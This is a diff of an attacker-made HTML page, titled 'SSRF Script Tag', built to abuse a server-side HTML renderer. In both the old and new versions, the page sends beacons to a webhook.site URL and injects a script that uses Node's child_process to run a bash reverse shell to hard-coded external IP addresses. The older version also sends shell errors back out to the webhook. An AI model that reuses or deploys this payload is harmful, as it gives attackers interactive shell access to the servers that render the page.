@@ -3,32 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF Node Injection</title>
+    <title>SSRF Script Tag</title>
 </head>
 <body>
     <h1>Shelling...</h1>
     <script>
         const webhook = 'https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84';
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: 'test=NodeInjectionAttempt'
-        });
+        fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'test=ScriptTagAttempt' });
         
-        // Attempt Node context via data URI
-        const shellScript = `
+        const script = document.createElement('script');
+        script.text = `
             const cp = require('child_process');
-            cp.exec('bash -i >& /dev/tcp/3.134.125.175/13888 0>&1', (err) => {
-                if (err) {
-                    fetch('${webhook}', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                        body: 'shellError=' + encodeURIComponent(err.message)
-                    });
-                }
-            });
+            cp.exec('bash -i >& /dev/tcp/13.202.226.61/13888 0>&1');
         `;
-        window.location = 'data:application/javascript,' + encodeURIComponent(shellScript);
+        document.body.appendChild(script);
     </script>
 </body>
 </html>
